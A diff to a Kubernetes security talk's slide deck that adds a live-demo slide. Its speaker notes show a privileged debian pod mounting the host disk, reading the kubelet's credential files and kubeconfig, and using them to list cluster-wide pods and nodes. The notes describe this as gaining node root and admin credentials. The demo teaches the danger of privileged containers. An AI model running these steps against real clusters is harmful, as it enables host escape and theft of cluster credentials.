@@ -173,6 +173,34 @@ spec:
 
 <!--
 Who can give me an example of what this container can actually do, say if a remote code exploit is found, or your code is bad?
+-->
+---
+
+<!-- _class: lead invert -->
+
+![bg](./images/bg.svg)
+
+# Live demo
+
+<!--
+set +o history
+kind create cluster
+
+kubectl run --rm --privileged --image debian -ti priv
+
+  ls /dev
+
+  mkdir /foo && mount /dev/vda1 /foo
+  export PATH=$PATH:$(find /foo/ -type f -name kubectl | head -n 1 | sed -r 's|/[^/]+$||')
+  ln -s $(find /foo -type l -name kubelet-client-current.pem  | sed -r 's|/[^/]+$||'| sed -r 's|/[^/]+$||') /var/lib/
+  export KUBECONFIG=$(find /foo/ -type f -name kubelet.conf)
+  kubectl get pods -A
+  kubectl get nodes
+
+kubectl run --image debian -ti unpriv
+
+---
+
  - repartition disks
  - eBPF interception of kernel wide activity including network intercept
  - mount the root or any other file system which is a bad day, you've then got root on the node complete with the kubelet, which with a couple of get requests to the api server gives you admin and service account credentials on the api server.
